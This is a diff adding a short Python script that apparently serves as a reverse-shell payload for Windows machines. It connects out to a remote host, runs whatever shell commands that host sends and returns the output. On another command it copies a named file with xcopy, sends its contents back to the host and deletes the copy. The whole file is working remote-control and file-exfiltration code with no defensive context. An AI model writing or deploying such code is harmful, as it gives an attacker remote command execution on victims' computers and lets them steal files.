@@ -1,0 +1,43 @@
+import socket
+import subprocess
+import os.path
+s = socket.socket()
+s.connect((host,port))
+while True:
+    msg = s.recv(1024).decode("utf-8")
+    p=msg.split(",")
+    if p[0]=="1":
+       try:
+          a=subprocess.check_output(msg[2:],shell=True,universal_newlines=True)
+       except:
+          a=""
+       if a=="":
+          s.send(bytes("0","utf-8"))
+       else:
+          s.send(bytes("1","utf-8"))
+          s.send(bytes(a,"utf-8"))
+    elif p[0]=="2":
+       filename = p[2]
+       file_with_quote=p[1]+"/"+p[2]
+       mmm=0
+       if os.path.exists(file_with_quote)==True:   # to avoid error due to wrong location
+          if os.path.exists(filename)==False:      #file will only copy if it is not presen at location of payload
+             a5="xcopy "+"\""+p[1]+"\\"+p[2]+"\""
+             subprocess.call(a5,shell=True)
+             print(a5)
+             mmm=1
+          f = open(filename,"rb")
+          q = f.read()
+          r = len(q)
+          s.send(bytes(str(r)+"k","utf-8"))
+          f.close()
+          f1 = open(filename,"rb")
+          l = f1.read()
+          s.send(l)
+          f1.close()
+          if mmm==1:
+            a6="del /f "+filename 
+            subprocess.call(a6,shell=True)
+       else:
+          s.send(bytes("l","utf-8"))     
+a = input()
